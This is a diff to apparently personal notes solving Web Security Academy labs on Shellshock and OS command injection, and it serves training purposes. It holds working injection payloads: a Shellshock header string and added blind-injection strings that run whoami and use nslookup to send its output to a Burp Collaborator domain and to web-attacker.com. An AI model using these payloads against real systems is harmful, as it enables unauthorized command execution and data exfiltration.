@@ -11,9 +11,13 @@ For exploitation part:<br>
 `() { :; }; /usr/bin/nslookup $(whoami).4diew0hehvzuachcyn7t9rpax13s3gs.burpcollaborator.net` <br>
 <b>Referer header</b> - Delete the old strings and put the ip `http://192.168.0.X:8080/` but and the X letter we have to put the $ symbols and in payload tab we have to choose `numbers` starting from 1 to 255 with step 1 and start the attack. After a few requests we can see our results in burpcollaborator.
 
-## OS command injection
+## OS command injection ✅
 1. <b>OS command injection, simple case</b> - Go to `https://xxxx.web-security-academy.net/product?productId=x` and start intercepting from burp while pressing the check stock button. Send it to repeater and chain the `whoami` command at the end of productId=x `productId=333;whoami&storeId=1`
 2. <b>Blind OS command injection with time delays</b> - Go to <b>submit feedback</b> and submit the form and intercept the request. To solve this lab your email param has to look like this `&email=aa%26+ping+-c+10+127.0.0.1+%26`
+3. <b>Blind OS command injection with output redirection</b> - ```& whoami > /var/www/static/whoami.txt &``` but url encoded in email parameter
+4. <b>Blind OS command injection with out-of-band interaction</b> - ```& nslookup kgji2ohoyw.web-attacker.com &``` but url encoded in email parameter
+5. <b>Blind OS command injection with out-of-band data exfiltration</b> - ```& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``` but url encoded in email parameter
+
 
 
 ## HTTP Host header attacks
